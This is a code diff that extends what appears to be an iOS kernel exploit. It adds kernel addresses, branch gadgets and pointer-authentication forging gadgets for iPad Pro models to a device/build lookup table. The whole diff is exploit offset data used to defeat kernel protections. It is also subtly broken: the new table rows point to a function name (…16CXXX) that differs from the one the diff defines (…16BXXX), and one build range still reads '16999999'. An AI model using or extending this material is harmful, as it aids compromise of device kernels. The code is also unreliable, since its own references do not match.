@@ -216,6 +216,25 @@ addresses__iphone11_6__16BXXX() { //XS-B
     OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result) = 0xf0;
     OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result) = 0xe8;
 }
+static void
+addresses__ipad8_8__16BXXX() { //iPadPro-B
+    ADDRESS(paciza_pointer__l2tp_domain_module_start)	    = SLIDE(0xfffffff009041658);
+    ADDRESS(paciza_pointer__l2tp_domain_module_stop)	    = SLIDE(0xfffffff009041660);
+    ADDRESS(l2tp_domain_inited) 			    = SLIDE(0xfffffff0090f5b00);
+    ADDRESS(sysctl__net_ppp_l2tp)                           = SLIDE(0xfffffff009041540);
+    ADDRESS(sysctl_unregister_oid)                          = SLIDE(0xfffffff007f34118);
+    ADDRESS(mov_x0_x4__br_x5)                               = SLIDE(0xfffffff0088fc568);
+    ADDRESS(mov_x9_x0__br_x1)                               = SLIDE(0xfffffff00892d9bc);
+    ADDRESS(mov_x10_x3__br_x6)                              = SLIDE(0xfffffff0088ecb6c);
+    ADDRESS(kernel_forge_pacia_gadget)                      = SLIDE(0xfffffff007bdd3e0);
+    ADDRESS(kernel_forge_pacda_gadget)                      = SLIDE(0xfffffff007bdd408);
+    ADDRESS(IOUserClient__vtable)                           = SLIDE(0xfffffff0077d4e48);
+    ADDRESS(IORegistryEntry__getRegistryEntryID)            = SLIDE(0xfffffff00808c49c);
+    SIZE(kernel_forge_pacxa_gadget_buffer)                  = 0x110;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, first_access)  = 0xe8;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result)  = 0xf0;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result)  = 0xe8;
+}
 
 
 
@@ -223,18 +242,26 @@ addresses__iphone11_6__16BXXX() { //XS-B
 static struct initialization addresses[] = {
     { "iPhone11,8", "16A00000-16A99999",       addresses__iphone11_8__16AXXX }, //XR-A
     { "iPhone11,8", "16B00000-16B99999",       addresses__iphone11_8__16BXXX }, //XR-B
-	{ "iPhone11,8", "16C00000-16C99999",       addresses__iphone11_8__16CXXX }, //XR-C
+    { "iPhone11,8", "16C00000-16C99999",       addresses__iphone11_8__16CXXX }, //XR-C
     { "iPhone11,2", "16A00000-16A99999",       addresses__iphone11_6__16AXXX }, //XS-A
-    { "iPhone11,2", "16B00000-1699999",       addresses__iphone11_6__16BXXX }, //XS-B
-	{ "iPhone11,2", "16C00000-16C99999",       addresses__iphone11_6__16CXXX }, //XS-C
+    { "iPhone11,2", "16B00000-16999999",       addresses__iphone11_6__16BXXX }, //XS-B
+    { "iPhone11,2", "16C00000-16C99999",       addresses__iphone11_6__16CXXX }, //XS-C
     { "iPhone11,4", "16A00000-16A99999",       addresses__iphone11_6__16AXXX }, //XSMaxChina-A
     { "iPhone11,4", "16B00000-16B99999",       addresses__iphone11_6__16BXXX }, //XSMaxChina-B
     { "iPhone11,4", "16C00000-16C99999",       addresses__iphone11_6__16CXXX }, //XSMaxChina-C
     { "iPhone11,6", "16A00000-16A99999",       addresses__iphone11_6__16AXXX }, //XSMax-A
     { "iPhone11,6", "16B00000-16B99999",       addresses__iphone11_6__16BXXX }, //XSMax-B
     { "iPhone11,6", "16C00000-16C99999",       addresses__iphone11_6__16CXXX }, //XSMax-C
-	{ "iPhone10,1", "16B92",        addresses__iphone10_1__16B92  }, //X-B
-    { "iPhone10,1", "16C101",       addresses__iphone10_1__16C101 }, //X-C
+    { "iPad8,8"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro12.9-B
+    { "iPad8,7"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro12.9-B
+    { "iPad8,6"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro12.9-B
+    { "iPad8,5"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro12.9-B
+    { "iPad8,4"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro11-B
+    { "iPad8,3"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro11-B
+    { "iPad8,2"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro11-B
+    { "iPad8,1"   , "16B00000-16B99999",       addresses__ipad8_8__16CXXX }, //iPadPro11-B
+    { "iPhone10,1", "16B92",        	       addresses__iphone10_1__16B92  }, //X-B
+    { "iPhone10,1", "16C101",       	       addresses__iphone10_1__16C101 }, //X-C
 };
 
 // ---- PAC initialization ------------------------------------------------------------------------
